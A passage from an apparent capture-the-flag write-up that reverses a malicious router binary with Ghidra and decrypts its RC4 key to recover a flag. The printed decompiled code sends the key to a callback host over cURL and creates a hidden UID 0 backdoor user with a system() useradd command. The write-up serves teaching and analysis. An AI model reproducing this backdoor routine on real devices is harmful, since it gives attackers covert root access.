</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar7;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Ghidra does a pretty good job of decompiling this function.  First, the function initializes a crypto library, as seen in these lines:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span></code></pre></div><p>The third argument to the <code>init_crypto_lib</code> library is then used as an argument to <code>cURL</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span></code></pre></div><p>The code then checks to make sure that the hostname of the router is <!-- raw HTML omitted -->HSTERUNI-GW-01<!-- raw HTML omitted -->, and that the user is root.  It returns -1 if either of these conditions are not met.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>(<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ...
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If both of these conditions are met, the code then checks to see if the user <code>zombie_lord</code> exists.  If it does not, it installs the <code>shadow-useradd</code> package, and creates the user.  It sets the password to the same value as the crypto key that was passed to cURL earlier.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>        );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span></code></pre></div><p>The next thing to do is reverse the crypto library, and figure out what the key is.  The crypto library is fairly simple, and can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">key_rounds_init</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,undefined <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#f92672">*</span>puVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar5;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar7;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_1);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  puVar4 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    puVar4 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  iVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    iVar7 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int</span>)sVar2;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">trap</span>(<span style="color:#ae81ff">0x1c00</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pbVar6 <span style="color:#f92672">=</span> param_2 <span style="color:#f92672">+</span> iVar3;
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar6;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> iVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    iVar5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">int</span>)param_1[iVar7] <span style="color:#f92672">+</span> (uint)bVar1 <span style="color:#f92672">+</span> iVar5) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x100</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar6 <span style="color:#f92672">=</span> param_2[iVar5];
</span></span><span style="display:flex;"><span>    param_2[iVar5] <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (iVar3 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x100</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">perform_rounds</span>(<span style="color:#66d9ef">int</span> param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,<span style="color:#66d9ef">int</span> param_3)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar2;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  uint uVar5;
</span></span><span style="display:flex;"><span>  uint uVar6;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(param_2);
</span></span><span style="display:flex;"><span>  uVar6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  uVar5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (sVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; sVar4 <span style="color:#f92672">!=</span> sVar2; sVar4 <span style="color:#f92672">=</span> sVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    uVar5 <span style="color:#f92672">=</span> uVar5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    pbVar3 <span style="color:#f92672">=</span> (byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar5);
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>    uVar6 <span style="color:#f92672">=</span> bVar1 <span style="color:#f92672">+</span> uVar6 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> uVar6) <span style="color:#f92672">=</span> bVar1;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_3 <span style="color:#f92672">+</span> sVar4) <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> ((uint)bVar1 <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)) <span style="color:#f92672">^</span> param_2[sVar4];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We could go through the trouble of reversing this, but if this is a standard crypto algorithm, we should be able to find it and use a pre-existing implementation.</p>
<p>I plugged the Ghidra decompilation directly into ChatGPT and asked it to identify the algorithm.  It returned the following:</p>
<p><img src="./images/7-chatgpt_question.png" alt="ChatGPT Question"></p>
<p><img src="./images/8-chatgpt_response.png" alt="ChatCPT Answer"></p>
<p>Now that we know the encryption algorithm is RC4, we can use a pre-existing implementation to decrypt the data.  I grabbed the key and the data to decrypt from the binary, and plugged them into CyberChef:</p>
<p><img src="./images/9-cyberchef_rc4.png" alt="CyberChef Key Decode"></p>
<p>That got us the second half of the flag!</p>
<h2 id="conclusion">Conclusion</h2>
<p>This was a fun multi-step challenge that required a number of different skills to solve.  I enjoyed the challenge, and I hope you enjoyed the writeup!</p>
]]></content>
		</item>
		
	</channel>
</rss>
